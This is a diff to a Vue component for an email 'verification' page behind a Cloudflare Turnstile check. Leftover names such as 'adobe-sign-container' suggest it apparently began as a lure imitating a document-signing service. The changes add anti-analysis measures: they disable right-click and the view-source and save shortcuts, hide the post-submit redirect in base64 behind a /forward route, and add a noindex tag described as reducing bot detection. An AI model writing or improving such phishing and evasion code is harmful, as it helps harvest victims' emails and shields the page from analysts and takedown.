@@ -2,37 +2,37 @@
   <div v-if="!captchaToken" class="gate-container">
     <main>
       <div class="instructions">
-        <p>Please stand by while we are checking if the site connection is secure.</p>
+        <p>Please stand by while we are checking if your connection is secure.</p>
         <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
       </div>
     </main>
   </div>
 
   <div v-else class="background">
-    <div class="adobe-sign-container">
-      <div class="sign-card">
+    <div class="email-verify-container">
+      <div class="verify-card">
         <div class="header">
           <div class="logo-text">
             <span class="success-check">⼈</span>
-            <span>Before we continue...</span>
+            <span>Verify Your Access</span>
           </div>
         </div>
         <div class="content">
-          <p><strong>This content is protected, please confirm your email address.</strong></p>
+          <p><strong>Please confirm your email address to continue.</strong></p>
           <div class="form-wrapper">
             <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
             <input id="honeypot" v-model="honeypot" type="text" style="display: none;" tabindex="-1" autocomplete="off" aria-hidden="true" />
             <label for="email" class="visually-hidden">Email address</label>
-            <input id="email" v-model="email" type="email" placeholder="Enter email" required class="email-input" :disabled="loading" />
+            <input id="email" v-model="email" type="email" placeholder="Enter your email" required class="email-input" :disabled="loading" />
             <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>
             <button @click="submitForm" :disabled="loading" class="action-button">
-              {{ loading ? 'Verifying…' : 'CONTINUE' }}
+              {{ loading ? 'Submitting…' : 'Submit' }}
             </button>
           </div>
         </div>
         <div class="divider"></div>
         <div class="footer-container">
-          <p class="footer-text">© 2025 All rights reserved.</p>
+          <p class="footer-text">© 2025 All rights reserved. <a href="/privacy" target="_blank">Privacy Policy</a> | <a href="/terms" target="_blank">Terms</a></p>
         </div>
       </div>
     </div>
@@ -49,6 +49,12 @@ const captchaToken = ref(null)
 
 onMounted(async () => {
   await nextTick()
+  document.addEventListener('contextmenu', e => e.preventDefault())
+  document.addEventListener('keydown', e => {
+    if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p' || e.key === 'Shift')) {
+      e.preventDefault()
+    }
+  })
   if (window.turnstile) {
     window.turnstile.render('.cf-turnstile', {
       sitekey: '0x4AAAAAABgei6QZruCN7n08',
@@ -79,7 +85,8 @@ async function submitForm() {
       throw new Error(data.message || 'Verification failed')
     }
     if (data.redirectUrl) {
-      window.location.href = data.redirectUrl
+      const encoded = btoa(data.redirectUrl)
+      window.location.href = `/forward?data=${encoded}`
     }
   } catch (err) {
     error.value = err.message
@@ -89,7 +96,10 @@ async function submitForm() {
 }
 </script>
 
-
+<!-- Metadata to reduce bot detection and indexing -->
+<head>
+  <meta name="robots" content="noindex,nofollow">
+</head>
 
 
 
